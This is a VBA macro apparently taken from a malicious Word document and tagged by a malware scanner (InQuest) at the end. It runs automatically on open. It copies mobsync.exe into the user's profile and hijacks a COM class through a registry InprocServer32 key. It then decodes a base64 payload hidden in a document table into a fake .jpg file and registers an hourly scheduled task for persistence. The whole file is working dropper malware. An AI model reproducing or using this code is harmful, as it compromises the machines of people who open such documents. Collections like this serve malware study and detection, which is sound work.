Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Sub AutoOpen()
    Call Entry
End Sub
Private Sub Entry()
    On Error Resume Next
    sMob = Environ("APPDATA")
    sMob = sMob & "\mobsync.exe"
    Set fsoCheck = CreateObject("Scripting.FileSystemObject")
    sAppData = Environ("LOCALAPPDATA") & "\Log_Error.jpg"
    iCheck = False
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If (fsoCheck.FileExists("C:\Windows\SysWOW64\cmd.exe") = True) Then
        iCheck = True
    Else
        iCheck = False
    End If
    
    sBaseMob = Environ("SystemRoot") & "\System32\mobsync.exe"
    If (fsoCheck.FileExists(sMob) = False) Then
        fso.CopyFile sBaseMob, sMob, True
    Else
    End If
    
    If (iCheck = True) Then
        Set wsh = CreateObject("WScript.Shell")
        waitOnReturn = True
        sCmd = "cmd.exe /S /C reg add  HKEY_CURRENT_USER\Software\Classes\CLSID\"
        sCmd = sCmd & "{3734FF83-6764-44B7-A1B9-55F56183CDB0}\InprocServer32"
        sCmd = sCmd & " /ve /t REG_SZ /d "
        sCmd = sCmd & sAppData & " /f /reg:64"
        windowStyle = 0
        wsh.Run sCmd, windowStyle, waitOnReturn
    Else
        Const HKEY_CURRENT_USER = &H80000001
        s = CreateKey(".", HKEY_CURRENT_USER, "Software\Classes\CLSID")
        s = CreateKey(".", HKEY_CURRENT_USER, "Software\Classes\CLSID\{3734FF83-6764-44B7-A1B9-55F56183CDB0}")
        s = CreateKey(".", HKEY_CURRENT_USER, "Software\Classes\CLSID\{3734FF83-6764-44B7-A1B9-55F56183CDB0}\InprocServer32")
        s = SetString(".", HKEY_CURRENT_USER, "Software\Classes\CLSID\{3734FF83-6764-44B7-A1B9-55F56183CDB0}\InprocServer32", "", sAppData, 64)
    End If
    Dim b As String
    Dim a As String
    Dim tableNew As Table
    Set tableNew = ActiveDocument.Tables(1)
    
    If (iCheck = False) Then
        a = tableNew.Cell(1, 1).Range.Text
        a = Left(a, Len(a) - 2)
    Else
        a = tableNew.Cell(1, 2).Range.Text
        a = Left(a, Len(a) - 2)
    End If
    b = Base64Decode(a, sAppData)
    yiBhyERIualWRmBjcsIbCZL
End Sub
Function CreateKey(ByVal Resource, ByVal hDefKey, ByVal SubKeyName)
    Set objReg = GetObject("winmgmts:\\" & Resource & "\root\default:StdRegProv")
    s = objReg.CreateKey(hDefKey, SubKeyName)
End Function

Function SetString(ByVal Resource, ByVal hDefKey, ByVal SubKeyName, ByVal ValueName, ByVal Value, ByVal Architecture)
    Const wbemAuthenticationLevelPktPrivacy = 6
    Const wbemImpersonationLevelImpersonate = 3
    Dim oCtx: Set oCtx = CreateObject("WbemScripting.SWbemNamedValueSet")
    oCtx.Add "__ProviderArchitecture", Architecture
    oCtx.Add "__RequiredArchitecture", True
    Dim oLocator: Set oLocator = CreateObject("Wbemscripting.SWbemLocator")
    oLocator.Security_.ImpersonationLevel = wbemImpersonationLevelImpersonate
    oLocator.Security_.AuthenticationLevel = wbemAuthenticationLevelPktPrivacy
    Dim oReg: Set oReg = oLocator.ConnectServer(Resource, "root\default", "", "", , , , oCtx).Get("StdRegProv")
    Dim oInParams: Set oInParams = oReg.Methods_("SetStringValue").InParameters
    oInParams.hDefKey = hDefKey
    oInParams.sSubKeyName = SubKeyName
    oInParams.sValueName = ValueName
    oInParams.sValue = Value
    Dim oOutParams: Set oOutParams = oReg.ExecMethod_("SetStringValue", oInParams, , oCtx)
    SetString = oOutParams.ReturnValue
End Function


Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.Charset = "utf-8"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Function Base64Decode(ByVal vCode, ByVal sPath)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.Text = vCode
    
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write oNode.nodeTypedValue
    objStream.SaveToFile sPath, 2
    
    Set objStream = Nothing
    Set oNode = Nothing
    Set oXML = Nothing
End Function


Function yiBhyERIualWRmBjcsIbCZL()
    Set objShell = CreateObject("WScript.Shell")
    sMob = Environ("APPDATA")
    sMob = sMob & "\mobsync.exe"
    Const TriggerTypeTime = 1
    Const ActionTypeExec = 0
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim rootFolder
    Set rootFolder = service.GetFolder("\")
    Dim taskDefinition
    Set taskDefinition = service.NewTask(0)
    Dim principal
    Set principal = taskDefinition.principal
    principal.LogonType = 3
    Dim settings
    Set settings = taskDefinition.settings
    settings.Enabled = True
    settings.StartWhenAvailable = True
    settings.Hidden = False
    Dim triggers
    Set triggers = taskDefinition.triggers
    Dim trigger
    Set trigger = triggers.Create(TriggerTypeTime)
    Dim startTime, endTime
    Dim time
    time = DateAdd("s", 30, Now)
    startTime = XmlTime(time)
    trigger.StartBoundary = startTime
    trigger.Enabled = True
    Dim Repetition
    Set Repetition = trigger.Repetition
    Repetition.Interval = "PT" & "60" & "M"
    Dim Action
    Set Action = taskDefinition.Actions.Create(ActionTypeExec)
    Action.Path = sMob
    Action.Arguments = ""
    Call rootFolder.RegisterTaskDefinition("MobSyncs", taskDefinition, 6, , , 3)
End Function


Function XmlTime(t)
    Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
    Dim tTime, tDate
    cSecond = "0" & Second(t)
    cMinute = "0" & Minute(t)
    CHour = "0" & Hour(t)
    cDay = "0" & Day(t)
    cMonth = "0" & Month(t)
    cYear = Year(t)
    tTime = Right(CHour, 2) & ":" & Right(cMinute, 2) & _
        ":" & Right(cSecond, 2)
    tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
    XmlTime = tDate & "T" & tTime
End Function




' InQuest injected base64 decoded content
' VF`cr

INQUEST-PP=macro
